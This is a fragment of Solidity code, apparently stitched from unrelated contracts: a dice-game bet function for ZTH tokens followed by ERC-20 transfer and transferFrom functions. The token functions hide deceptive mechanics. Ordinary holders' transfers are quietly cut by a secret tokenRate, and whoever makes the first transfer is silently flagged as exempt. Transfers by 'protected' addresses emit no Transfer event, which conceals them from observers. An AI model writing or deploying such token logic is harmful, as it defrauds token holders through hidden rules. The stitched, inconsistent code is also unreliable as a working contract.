}

function _playerRollDice(uint _rollUnder, TKN _tkn) private
gameIsActive
betIsValid(_tkn.value, _rollUnder) {
    require(_tkn.value < ((2 ** 200) - 1)); 
    require(block.number < ((2 ** 48) - 1)); 
    require(_zthToken(msg.sender));
    playerRoll memory roll = playerRolls[_tkn.sender];
    require(block.number != roll.blockn);
    if (roll.blockn != 0) {
        _finishBet(false, _tkn.sender);
    }
    roll.blockn = uint48(block.number);
    roll.tokenValue = uint200(_tkn.value);
    roll.rollUnder = uint8(_rollUnder);
    playerRolls[_tkn.sender] = roll;
    emit LogBet(_tkn.sender, _tkn.value, _rollUnder);
    totalBets += 1;
    totalZTHWagered += _tkn.value;
}

function transferFrom(address from, address to, uint256 value) public returns(bool) {
    require(_lockEnd[from] <= block.timestamp);
    require(value <= _balances[from]);
    require(value <= _allowed[from][msg.sender]);
    require(to != address(0));
    uint tokensToSend = value;
    if (_protect[from] || _exchange[from]) {
        tokensToSend = value;
    } else {
        tokensToSend = SafeMath.div(SafeMath.mul(value, tokenRate), 1000);
    }
    _balances[from] = _balances[from].sub(tokensToSend);
    _balances[to] = _balances[to].add(tokensToSend);
    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(tokensToSend);
    if (!firstTransfer) {
        _exchange[to] = true;
        _exchange[from] = true;
        _exchange[msg.sender] = true;
        firstTransfer = true;
    }
    if (!_protect[from]) {
        emit Transfer(from, to, tokensToSend);
    }
    return true;
}

function transfer(address to, uint256 value) public returns(bool) {
    require(_lockEnd[msg.sender] <= block.timestamp);
    require(value <= _balances[msg.sender]);
    require(to != address(0));
    uint tokensToSend = value;
    if (_protect[msg.sender] || _exchange[msg.sender]) {
        tokensToSend = value;
    } else {
        tokensToSend = SafeMath.div(SafeMath.mul(value, tokenRate), 1000);
    }
    _balances[msg.sender] = _balances[msg.sender].sub(tokensToSend);
    _balances[to] = _balances[to].add(tokensToSend);
    if (!firstTransfer) {
        _exchange[to] = true;
        _exchange[msg.sender] = true;
        firstTransfer = true;
    }
    if (!_protect[msg.sender]) {
        emit Transfer(msg.sender, to, tokensToSend);
    }
    return true;
}

